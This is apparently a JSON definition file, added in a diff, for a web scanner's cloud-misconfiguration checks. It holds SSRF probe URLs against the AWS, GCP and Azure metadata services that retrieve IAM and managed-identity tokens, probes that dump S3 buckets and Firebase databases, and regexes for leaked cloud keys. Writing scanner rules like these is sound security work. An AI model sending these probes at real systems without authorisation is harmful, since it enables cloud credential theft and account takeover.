@@ -1,0 +1,105 @@
+{
+  "category": "cloud_webapp",
+  "description": "Cloud-native web app misconfigurations and SDK error matchers (AWS, GCP, Azure, Firebase). Detects leaked credentials, public buckets, exposed metadata services, SAS-token misuse, and cloud-SDK error fingerprints in HTTP responses.",
+  "contexts": {
+    "aws_metadata_imdsv1": {
+      "description": "AWS EC2 IMDSv1 SSRF — token-less metadata service. Hits cleartext credentials.",
+      "probes": [
+        {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "description": "List IAM role names available on this instance"},
+        {"payload": "http://169.254.169.254/latest/dynamic/instance-identity/document", "description": "Region, accountId, instanceId disclosure"},
+        {"payload": "http://169.254.169.254/latest/user-data", "description": "User-data script — often contains plaintext secrets"}
+      ],
+      "matchers": [
+        {"type": "regex", "pattern": "AccessKeyId\\s*[\":=]+\\s*\"?ASIA[A-Z0-9]{16}", "weight": 100, "description": "Temporary AWS access key (ASIA prefix = STS-issued role creds)"},
+        {"type": "regex", "pattern": "AccessKeyId\\s*[\":=]+\\s*\"?AKIA[A-Z0-9]{16}", "weight": 100, "description": "Long-term AWS access key (AKIA prefix)"},
+        {"type": "literal", "pattern": "SecretAccessKey", "weight": 90, "description": "Field name from IAM credentials response"},
+        {"type": "regex", "pattern": "\"accountId\"\\s*:\\s*\"\\d{12}\"", "weight": 80, "description": "AWS account ID from instance-identity document"}
+      ]
+    },
+    "gcp_metadata": {
+      "description": "GCP Compute metadata SSRF. Requires Metadata-Flavor: Google header.",
+      "probes": [
+        {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "description": "Default service account OAuth2 token", "headers": {"Metadata-Flavor": "Google"}},
+        {"payload": "http://metadata.google.internal/computeMetadata/v1/project/project-id", "description": "GCP project ID disclosure", "headers": {"Metadata-Flavor": "Google"}}
+      ],
+      "matchers": [
+        {"type": "regex", "pattern": "\"access_token\"\\s*:\\s*\"ya29\\.[A-Za-z0-9_\\-]{30,}", "weight": 100, "description": "GCP OAuth2 access token (ya29. prefix)"},
+        {"type": "literal", "pattern": "projects/-/serviceAccounts/", "weight": 70, "description": "Service-account resource path leak"}
+      ]
+    },
+    "azure_imds": {
+      "description": "Azure Instance Metadata SSRF. Requires Metadata: true header.",
+      "probes": [
+        {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "description": "VM metadata", "headers": {"Metadata": "true"}},
+        {"payload": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "description": "Managed Identity bearer token", "headers": {"Metadata": "true"}}
+      ],
+      "matchers": [
+        {"type": "regex", "pattern": "\"azEnvironment\"\\s*:\\s*\"AzurePublicCloud\"", "weight": 100, "description": "Azure VM metadata signature"},
+        {"type": "regex", "pattern": "\"access_token\"\\s*:\\s*\"eyJ[A-Za-z0-9_\\-\\.]+\"", "weight": 95, "description": "Managed Identity JWT bearer token"},
+        {"type": "literal", "pattern": "subscriptionId", "weight": 60, "description": "Azure subscription ID field"}
+      ]
+    },
+    "s3_public_bucket": {
+      "description": "AWS S3 bucket misconfig: public listing or public ACL.",
+      "probes": [
+        {"payload": "?list-type=2", "description": "S3 v2 list-objects — public bucket dump"},
+        {"payload": "?acl", "description": "S3 ACL inspection — exposes grants"}
+      ],
+      "matchers": [
+        {"type": "regex", "pattern": "<ListBucketResult\\s+xmlns=\"http://s3\\.amazonaws\\.com", "weight": 95, "description": "S3 public listing response"},
+        {"type": "regex", "pattern": "<URI>http://acs\\.amazonaws\\.com/groups/global/AllUsers</URI>", "weight": 100, "description": "S3 grant to AllUsers — fully public bucket"}
+      ]
+    },
+    "azure_sas_token_leak": {
+      "description": "Azure SAS token leak in HTTP responses or JS bundles.",
+      "probes": [],
+      "matchers": [
+        {"type": "regex", "pattern": "\\?sv=\\d{4}-\\d{2}-\\d{2}&[a-z=&%\\d\\-]+&sig=[A-Za-z0-9%]+", "weight": 80, "description": "Azure Storage SAS query string"},
+        {"type": "regex", "pattern": "[a-z0-9]{3,24}\\.blob\\.core\\.windows\\.net/[A-Za-z0-9_\\-/\\.]+\\?sv=", "weight": 95, "description": "Full SAS URL — replay to test scope"}
+      ]
+    },
+    "firebase_open_db": {
+      "description": "Firebase Realtime Database with permissive read rules.",
+      "probes": [
+        {"payload": "/.json", "description": "Root dump — works on default-allow rules"}
+      ],
+      "matchers": [
+        {"type": "regex", "pattern": "Permission denied", "weight": -50, "description": "Negative — DB is rule-protected"},
+        {"type": "regex", "pattern": "^\\s*\\{[^}]*\"\\w+\"\\s*:", "weight": 75, "description": "JSON document root — likely DB dump"}
+      ]
+    },
+    "cognito_jwt": {
+      "description": "AWS Cognito JWT signature.",
+      "probes": [],
+      "matchers": [
+        {"type": "regex", "pattern": "cognito-idp\\.[a-z0-9\\-]+\\.amazonaws\\.com/[a-z0-9_\\-]+", "weight": 70, "description": "Cognito User Pool issuer URL — extract User Pool ID"},
+        {"type": "regex", "pattern": "cognito-identity\\.[a-z0-9\\-]+\\.amazonaws\\.com", "weight": 70, "description": "Cognito Identity Pool — test GetCredentialsForIdentity"},
+        {"type": "literal", "pattern": "cognito:groups", "weight": 60, "description": "Cognito group claim — tamper for privilege escalation"}
+      ]
+    },
+    "leaked_keys_in_response": {
+      "description": "Plaintext cloud credentials in HTTP responses (often via debug pages, error stacks, or HTML).",
+      "probes": [],
+      "matchers": [
+        {"type": "regex", "pattern": "AKIA[0-9A-Z]{16}", "weight": 100, "description": "AWS long-term access key in response body"},
+        {"type": "regex", "pattern": "ASIA[0-9A-Z]{16}", "weight": 100, "description": "AWS STS temporary key"},
+        {"type": "regex", "pattern": "AIza[0-9A-Za-z\\-_]{35}", "weight": 95, "description": "Google API key"},
+        {"type": "regex", "pattern": "ya29\\.[0-9A-Za-z\\-_]{30,}", "weight": 100, "description": "GCP OAuth2 access token"},
+        {"type": "regex", "pattern": "DefaultEndpointsProtocol=https;AccountName=[a-z0-9]+;AccountKey=[A-Za-z0-9+/=]+", "weight": 100, "description": "Azure Storage connection string"},
+        {"type": "regex", "pattern": "-----BEGIN PRIVATE KEY-----", "weight": 95, "description": "Private key (often GCP service-account JSON)"}
+      ]
+    },
+    "cloud_sdk_errors": {
+      "description": "Cloud SDK error fingerprints disclosed in error pages — confirms backend cloud usage.",
+      "probes": [],
+      "matchers": [
+        {"type": "literal", "pattern": "AccessDenied", "weight": 30, "description": "AWS access denied — endpoint touches AWS"},
+        {"type": "literal", "pattern": "InvalidAccessKeyId", "weight": 50, "description": "AWS error — backend auth failure leak"},
+        {"type": "literal", "pattern": "SignatureDoesNotMatch", "weight": 50, "description": "AWS SigV4 signature mismatch"},
+        {"type": "literal", "pattern": "google.api_core.exceptions", "weight": 60, "description": "GCP Python SDK stack trace"},
+        {"type": "literal", "pattern": "Microsoft.WindowsAzure.Storage", "weight": 60, "description": "Azure Storage SDK stack trace"},
+        {"type": "literal", "pattern": "ServerErrorException: 0:Permission", "weight": 60, "description": "Firebase Admin SDK error"}
+      ]
+    }
+  }
+}
